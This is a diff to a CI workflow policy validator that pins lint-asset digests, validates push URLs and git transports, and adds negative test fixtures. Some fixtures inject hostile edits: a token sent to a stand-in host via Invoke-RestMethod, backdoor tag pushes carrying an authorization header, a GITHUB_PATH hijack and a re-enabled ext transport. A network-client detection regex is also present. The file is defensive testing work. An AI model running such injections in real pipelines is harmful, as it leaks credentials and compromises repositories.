@@ -153,7 +153,7 @@ const NETWORK_CLIENT = /\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|i
 // shape of defence, so the reviewed script is pinned exactly. The cost is low
 // precisely because this step is temporary and frozen: T1B deletes it, and any
 // intentional edit before then is expected to update this digest deliberately.
-const REVIEWED_PUSH_STEP_DIGEST = 'e378fea66423b1c0511ce28b84c1c03695aa239cfb27b6405cebc9ff3c56b496';
+const REVIEWED_PUSH_STEP_DIGEST = 'ff7604ab17b30bdd64d1723f52c5e402c95430af5ac006c4df2c11c84dc92aa1';
 
 // The generator is repository-controlled code that runs in a job holding a
 // contents-write token, one step ahead of the push. Its version marker is fixed,
@@ -163,6 +163,17 @@ const REVIEWED_PUSH_STEP_DIGEST = 'e378fea66423b1c0511ce28b84c1c03695aa239cfb27b
 // review signal, not a gate on the writer — build.yml does not run this
 // validator, so the containment the push depends on is enforced in that step.
 const REVIEWED_GENERATOR_DIGEST = 'bb8ba306acb130f8f7b5fcc75153f3c6bc69735ac5de4faffa6d38055535783f';
+
+// The lint phases execute these two files out of the checkout. The rule
+// configuration decides which rules run at all, and the nested-fence helper is
+// the entirety of the second phase, yet the reviewed package digests cover only
+// what npm installs. Editing either leaves every command string, captured
+// status, and digest intact while both phases report zero errors over nothing,
+// so what the lint does is pinned alongside what it runs.
+const REVIEWED_LINT_DIGESTS = Object.freeze({
+  '.markdownlint.jsonc': '5eb07bf7f30829e0091e82f235a96fdba21be1ef1160ca1e22cdbe8d82da5300',
+  'lint-nested-markdown.js': '4eefec7afba1c79809d916365b2eb3e2ea17aa482593338492a10d6dda5e2031',
+});
 
 const EXPECTED_VERSION = '1.0.20260731.0';
 const MAXIMUM_YAML_BYTES = 1024 * 1024;
@@ -417,6 +428,24 @@ export function validateBuildPolicy(workflow, source) {
       reject('side-effect-policy', `temporary writer does not pin ${required} for the push`);
     }
   }
+  // Repository-local .git/config is the one configuration file the generator can
+  // still write, and no GIT_CONFIG_GLOBAL or GIT_CONFIG_SYSTEM value suppresses
+  // it. get-url reports fetch URLs, so a validated origin says nothing about
+  // where a push goes once remote.origin.pushurl exists.
+  if (!pushStep.run.includes('remote get-url --push --all origin') ||
+      !pushStep.run.includes('push-policy: origin push URL is not one credential-free GitHub HTTPS URL')) {
+    reject('side-effect-policy', 'temporary writer does not validate the URL the push will contact');
+  }
+  // A transport allowlist, not a list of bad settings: ext:: and its siblings run
+  // a program that inherits the authorization header, and url.<base>.insteadOf
+  // can rewrite an already-validated URL into one of them. Restricting the
+  // transport makes that rewrite harmless.
+  for (const [key, value] of [['protocol.allow', 'never'], ['protocol.https.allow', 'always'], ['protocol.ext.allow', 'never'], ['credential.helper', '']]) {
+    const index = pushStep.run.indexOf(`= '${key}'`);
+    if (index < 0 || !pushStep.run.slice(index).includes(`= '${value}'`)) {
+      reject('side-effect-policy', `temporary writer does not pin ${key} for the push`);
+    }
+  }
   // Every ref namespace, not only refs/heads: a lease on main does not constrain
   // a push to refs/tags or anywhere else.
   for (const match of pushStep.run.matchAll(/refs\/([^'":\s]+)/gu)) {
@@ -598,6 +627,13 @@ export function validateMarkdownPolicy(workflow, source) {
     // so script-shell there is a lint bypass that leaves every other check green.
     "@('.npmrc', '../.npmrc', '../../.npmrc')",
     'supply: repository-controlled npm configuration is present',
+    // What the lint does, not only what it runs. Derived from the reviewed
+    // constants so the gate and this baseline cannot drift apart silently.
+    REVIEWED_LINT_DIGESTS['.markdownlint.jsonc'].toUpperCase(),
+    REVIEWED_LINT_DIGESTS['lint-nested-markdown.js'].toUpperCase(),
+    'Get-FileHash -LiteralPath .markdownlint.jsonc -Algorithm SHA256',
+    'Get-FileHash -LiteralPath lint-nested-markdown.js -Algorithm SHA256',
+    'supply: lint configuration or helper does not match the reviewed digest',
   ];
   for (const fragment of requiredFragments) {
     if (!validation.run.includes(fragment)) reject('markdown-policy', `required phase is missing: ${fragment}`);
@@ -618,6 +654,8 @@ export function validateMarkdownPolicy(workflow, source) {
     'supply: package metadata does not match the reviewed supply digest',
     // Must precede installation: npm reads .npmrc before it runs any command.
     'supply: repository-controlled npm configuration is present',
+    // Must precede the lint phases, which execute both of these files.
+    'supply: lint configuration or helper does not match the reviewed digest',
     'ci --ignore-scripts --no-audit --no-fund',
     'npm-ci: package metadata changed during frozen installation',
     './Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml',
@@ -803,8 +841,8 @@ const FIXTURE_INVENTORY = Object.freeze([
   ['T1-BUILD-044', 'push destination retargeted off main', 'build', (source) => replaceOnce(source, "ArgumentList.Add('HEAD:refs/heads/main')", "ArgumentList.Add('HEAD:refs/heads/backdoor')")],
   ['T1-BUILD-045', 'second push invocation added', 'build', (source) => replaceOnce(source, "              [void]$objStartInfo.ArgumentList.Add('push')\n", "              [void]$objStartInfo.ArgumentList.Add('push')\n              [void]$objStartInfo.ArgumentList.Add('push')\n")],
   ['T1-BUILD-046', 'alternate network client in a token-bearing step', 'build', (source) => replaceOnce(source, '          $strToken = $env:STYLE_GUIDE_PUSH_TOKEN', '          Invoke-RestMethod -Uri https://example.invalid -Body $env:STYLE_GUIDE_PUSH_TOKEN\n          $strToken = $env:STYLE_GUIDE_PUSH_TOKEN')],
-  ['T1-BUILD-047', 'tag push added to the writer step', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '1'", '              git -c "http.https://github.com/.extraheader=$strAuthorization" push origin HEAD:refs/tags/backdoor\n              $objStartInfo.Environment[\'GIT_CONFIG_COUNT\'] = \'1\'')],
-  ['T1-BUILD-048', 'direct git push form added to the writer step', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '1'", "              git push origin --tags\n              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '1'")],
+  ['T1-BUILD-047', 'tag push added to the writer step', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '5'", '              git -c "http.https://github.com/.extraheader=$strAuthorization" push origin HEAD:refs/tags/backdoor\n              $objStartInfo.Environment[\'GIT_CONFIG_COUNT\'] = \'5\'')],
+  ['T1-BUILD-048', 'direct git push form added to the writer step', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '5'", "              git push origin --tags\n              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '5'")],
   ['T1-BUILD-049', 'sequential push stream reads restored', 'build', (source) => replaceOnce(source, '              $objOutputTask = $objProcess.StandardOutput.ReadToEndAsync()\n              $objErrorTask = $objProcess.StandardError.ReadToEndAsync()\n              $strStandardOutput = $objOutputTask.GetAwaiter().GetResult()\n              $strStandardError = $objErrorTask.GetAwaiter().GetResult()\n', '              $strStandardOutput = $objProcess.StandardOutput.ReadToEnd()\n              $strStandardError = $objProcess.StandardError.ReadToEnd()\n')],
   ['T1-BUILD-050', 'sequential Git stream reads restored', 'build', (source) => replaceOnce(source, '                  $objCopyTask = $objProcess.StandardOutput.BaseStream.CopyToAsync($objOutput)\n                  $objErrorTask = $objProcess.StandardError.ReadToEndAsync()\n                  $objCopyTask.GetAwaiter().GetResult()\n                  $strError = $objErrorTask.GetAwaiter().GetResult()\n', '                  $objProcess.StandardOutput.BaseStream.CopyTo($objOutput)\n                  $strError = $objProcess.StandardError.ReadToEnd()\n')],
   ['T1-BUILD-051', 'indirect Git invocation in the writer', 'build', (source) => replaceOnce(source, "              [void]$objStartInfo.ArgumentList.Add('push')", `              $strDestination = 'refs/' + 'tags/backdoor'\n              & ($arrGitCommands[0].Source) -c "http.https://github.com/.extraheader=$strAuthorization" push origin "HEAD:$strDestination"\n              [void]$objStartInfo.ArgumentList.Add('push')`)],
@@ -858,6 +896,18 @@ const FIXTURE_INVENTORY = Object.freeze([
   }],
   ['T1-GENERATOR-001', 'generator body rewritten under an unchanged version marker', 'generator', (source) => `${source}\nfunction Invoke-Unreviewed { Add-Content -Path $env:GITHUB_PATH -Value '/tmp/hijack' }\n`],
   ['T1-GENERATOR-002', 'generator truncated', 'generator', (source) => source.slice(0, Math.floor(source.length / 2))],
+  ['T1-BUILD-063', 'push URL left unvalidated while only the fetch URL is checked', 'build', (source) => replaceOnce(source, '          $arrPushUrls = @(& $strGitPath remote get-url --push --all origin)\n', '          $arrPushUrls = @(& $strGitPath remote get-url --all origin)\n')],
+  ['T1-BUILD-064', 'transport allowlist removed from the credentialed push', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_KEY_1'] = 'protocol.allow'\n              $objStartInfo.Environment['GIT_CONFIG_VALUE_1'] = 'never'\n", '')],
+  ['T1-BUILD-065', 'command-executing ext transport re-permitted', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_VALUE_3'] = 'never'", "              $objStartInfo.Environment['GIT_CONFIG_VALUE_3'] = 'always'")],
+  ['T1-BUILD-066', 'credential helper reset removed', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_KEY_4'] = 'credential.helper'\n              $objStartInfo.Environment['GIT_CONFIG_VALUE_4'] = ''\n", '')],
+  ['T1-MARKDOWN-020', 'lint asset digest gate removed', 'markdown', (source) => replaceOnce(source, '          if ($strLintConfigHash -cne $strReviewedLintConfigHash -or $strLintHelperHash -cne $strReviewedLintHelperHash) {\n              throw \'supply: lint configuration or helper does not match the reviewed digest\'\n          }\n', '')],
+  ['T1-LINTASSET-001', 'all rules disabled in the lint configuration', 'lint-asset', {
+    '.markdownlint.jsonc': '{ "default": false }\n',
+    'lint-nested-markdown.js': '',
+  }],
+  ['T1-LINTASSET-002', 'nested-fence helper reduced to a successful no-op', 'lint-asset', {
+    'lint-nested-markdown.js': 'process.exit(0);\n',
+  }],
   ['T1-NPMRC-001', 'npm configuration beside the governed workflows', 'npm-config', {
     '/repo': [{ name: '.github', isDirectory: () => true }],
     '/repo/.github': [{ name: 'workflows', isDirectory: () => true }],
@@ -934,6 +984,8 @@ function runNegativeFixtures(buildSource, markdownSource, packageSource, lockSou
         validatePackagePolicy(...fixture(packageSource, lockSource));
       } else if (kind === 'generator') {
         validateGeneratorPolicy(fixture(generatorSource));
+      } else if (kind === 'lint-asset') {
+        validateLintAssetPolicy(fixture);
       } else if (kind === 'npm-config') {
         assertNoNpmConfiguration('/repo', '/repo', (directory) => fixture[directory] ?? []);
       } else {
@@ -1003,6 +1055,14 @@ export function assertNoNpmConfiguration(directory, repositoryRoot, readDirector
   }
 }
 
+export function validateLintAssetPolicy(assets) {
+  for (const [label, source] of Object.entries(assets)) {
+    if (createHash('sha256').update(source, 'utf8').digest('hex') !== REVIEWED_LINT_DIGESTS[label]) {
+      reject('supply-policy', `${label} does not match its reviewed digest`);
+    }
+  }
+}
+
 // Version first, then bytes: an intentional edit that forgot the version bump
 // should say so, rather than reporting only that a hash moved.
 export function validateGeneratorPolicy(source) {
@@ -1050,6 +1110,10 @@ export function validateRepositoryPolicy(buildPath, markdownPath) {
   // what those inputs were checked against, so removing an assertion here left
   // the reported hash unchanged. Evidence for a policy run has to bind the rules
   // as well as the material.
+  const lintAssets = Object.fromEntries(Object.keys(REVIEWED_LINT_DIGESTS).map(
+    (name) => [name, readOrdinaryText(join(workflowDirectory, name), name)],
+  ));
+  validateLintAssetPolicy(lintAssets);
   const validatorSource = readOrdinaryText(join(workflowDirectory, 'Validate-WorkflowPolicy.mjs'), 'validator');
 
   const fixtureCount = runNegativeFixtures(buildSource, markdownSource, packageSource, lockSource, generatorSource);
@@ -1071,6 +1135,7 @@ export function validateRepositoryPolicy(buildPath, markdownPath) {
         ['generator', generatorSource],
         ['package.json', packageSource],
         ['package-lock.json', lockSource],
+        ...Object.entries(lintAssets),
         ['validator', validatorSource],
       ]) {
         foldPolicyInput(hash, label, source);
